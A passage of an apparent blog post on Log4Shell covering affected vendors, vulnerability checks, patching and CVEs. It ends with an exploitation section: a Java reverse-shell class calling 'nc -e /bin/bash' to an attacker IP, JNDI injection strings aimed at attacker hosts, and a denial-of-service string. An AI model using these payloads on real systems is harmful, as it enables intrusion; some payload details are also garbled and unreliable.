  &lt;a href="#affected-companieslist-keeps-on-increasing"&gt;
  &lt;/a&gt;
  Affected Companies(List Keeps on increasing)
&lt;/h4&gt;

&lt;p&gt;Apple, Intel, Amazon, Oracle, VMWare, IBM, Cisco, Redhat, Atlassian, BMC, Fortinet, F5, McAfee, Twitter, Baidu, Tesla, Palo Alto, SonicWALL, SolarWinds&lt;/p&gt;

&lt;p&gt;Many opensource solution are also affected here is the list of applications who used java in their infrastructure like Apache Struts, Apache Struts2,Apache Tomcat, Apache Spark, Apache Solr, Apache Kafka, ElasticSearch, flume, Log stash, IBM Qradar SIEM, NetApp, Pulse Secure, etc.&lt;/p&gt;

&lt;p&gt;Checkout this link for knowing Log4j impact on manufacturers&lt;br&gt;
&lt;a href="https://github.com/YfryTchsGD/Log4jAttackSurface"&gt;https://github.com/YfryTchsGD/Log4jAttackSurface&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#what-are-hackers-doing-by-exploiting-this-vulnerability"&gt;
  &lt;/a&gt;
  What are Hackers Doing by Exploiting this Vulnerability
&lt;/h2&gt;

&lt;p&gt;Hackers are running ransomware campaign, Deploying botnets and Mine XMR coins on Compromised Systems. None the less if they get access to data they will steal it.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#why-companies-are-not-able-to-patch-log4j-completely"&gt;
  &lt;/a&gt;
  Why Companies are not able to patch Log4J Completely?
&lt;/h2&gt;

&lt;p&gt;Most of the companies have patched their code base for Log4j but the problem that most of them are facing is that all the vendors of company need to patch log4j package in their product which is out of their control and they cannot do anything in that.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#checking-if-the-site-is-vulnerable-to-log4j-rce"&gt;
  &lt;/a&gt;
  Checking if the site is Vulnerable to log4j RCE
&lt;/h2&gt;

&lt;p&gt;To check if the site is vulnerable to Log4J RCE first find areas where we can input strings (like search box, etc.).Then Visit &lt;a href="https://log4shell.huntress.com/"&gt;https://log4shell.huntress.com/&lt;/a&gt;&lt;br&gt;
and copy this text &lt;code&gt;${jndi:ldap://log4shell.huntress.com:1389/&amp;lt;Your unique identifier&amp;gt;}&lt;/code&gt; then paste it in the input area now go back to the page from where you copied and you will see a result keyword hyperlinked click on it and see if there is a entry of your site, if the entry is there then your site is vulnerable to log4j RCE.&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--4H0xmj20--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mw9wwg0mwh7a1vcqch74.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--4H0xmj20--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mw9wwg0mwh7a1vcqch74.png" alt="log4shell" width="880" height="468"&gt;&lt;/a&gt;Now lets understand what is &lt;code&gt;log4shell.huntress.com&lt;/code&gt; doing and how is it checking our site for vulnerability. For this we have to understand how our input is working&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;{jndi:....&lt;/code&gt; ------&amp;gt; this invokes JNDI API and access external resources&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;:idap:....&lt;/code&gt; -----&amp;gt; this shows that target will reach out to an attacker controlled location over idap protocol&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;code&gt;://log4shell.huntress.com:1389/&lt;/code&gt;-----&amp;gt; This is the address of attackers controlled host basically we are reaching out to this site.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All these parts makes us understand that we are establishing a connection between site and a attacker controlled host.&lt;/p&gt;

&lt;p&gt;Alternately you can use &lt;a href="https://github.com/cisagov/log4j-scanner"&gt;cisagov/log4j-scanner&lt;/a&gt; to scan for log4j Vulnerability on your site.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#fixing-the-vulnerability"&gt;
  &lt;/a&gt;
  Fixing The Vulnerability
&lt;/h2&gt;

&lt;p&gt;To fix this Vulnerability you should update your java and log4j to latest Version(i.e. Log4J V2.17 or above) this doesn't guarantee that Vulnerability is fully patched but reduces some what risk. Also check out snyk remediation cheat sheet &lt;a href="https://snyk.io/blog/log4shell-remediation-cheat-sheet/"&gt;https://snyk.io/blog/log4shell-remediation-cheat-sheet/&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#vulnerabilities-published-on-log4j"&gt;
  &lt;/a&gt;
  Vulnerabilities Published on Log4J
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;
&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-44228"&gt;CVE-2021-44228&lt;/a&gt; Version Affected: Apache Log4j2 2.0-beta9 a 2.12.1 y 2.13.0 a 2.15.0&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046"&gt;CVE-2021-45046&lt;/a&gt; Version Affected: 2.0.1 – 2.12.2 (excluded) y 2.13.0 – 2.16.0 (excluded)&lt;/li&gt;
&lt;li&gt;
&lt;a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2021-45105"&gt;CVE-2021-45105&lt;/a&gt; Version Affected:Log4j2 versions 2.0-alpha1 hasta 2.16.0 (included).&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;
  &lt;a href="#exploiting-vulnerability-only-for-cve202144228-and-cve202145046"&gt;
  &lt;/a&gt;
  Exploiting Vulnerability (ONLY FOR CVE-2021-44228 and CVE-2021-45046)
&lt;/h2&gt;

&lt;p&gt;for Exploiting this vulnerability we will be writing an payload and then we will be compiling it and then we will trigger it to get reverse shell.&lt;/p&gt;
&lt;h4&gt;
  &lt;a href="#follow-steps"&gt;
  &lt;/a&gt;
  Follow Steps:
&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Here we are considering that our targeted server's OS is linux and netcat is already installed in it.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;public class Exploit {
    static {
        try {
            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash &amp;lt;YOUR.ATTACKER.IP.ADDRESS&amp;gt; &amp;lt;Listening port&amp;gt;");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;ol&gt;
&lt;li&gt;Write exploit in Exploit.java file using above given code&lt;/li&gt;
&lt;li&gt;Compile the java file&lt;code&gt;javac Exploit.java -source 8 -target 8&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;Host a temporary HTTP server for exploit&lt;/li&gt;
&lt;li&gt;set a net cat listener to listen to exploit.&lt;code&gt;nc -lnvp &amp;lt;Attacker port number&amp;gt;&lt;/code&gt;
&lt;/li&gt;
&lt;li&gt;for CVE-2021-44228 put&lt;code&gt;{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:ATTACKER PORT/Exploit\}&lt;/code&gt;as input&lt;/li&gt;
&lt;li&gt;for CVE-2021-45046 put &lt;code&gt;{jndi:ldap://127.0.0.1#attacker.com/exploit}&lt;/code&gt; as input
1.you got a reverse shell.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;For CVE-2021-45105 we cannot get a reverse shell but we can use &lt;code&gt;${${::-${::-$${::-j}}}}&lt;/code&gt; this parameter to  to generate a StackOverflow exception that may lead to the termination of the vulnerable application process, giving rise to a denial of service (DoS) vulnerability.&lt;/p&gt;

&lt;p&gt;Use this link to get technical insight on the Vulnerability&lt;br&gt;
&lt;a href="https://businessinsights.bitdefender.com/technical-advisory-zero-day-critical-vulnerability-in-log4j2-exploited-in-the-wild"&gt;https://businessinsights.bitdefender.com/technical-advisory-zero-day-critical-vulnerability-in-log4j2-exploited-in-the-wild&lt;/a&gt;&lt;/p&gt;

</description>
      <category>security</category>
      <category>java</category>
      <category>opensource</category>
    </item>
  </channel>
</rss>
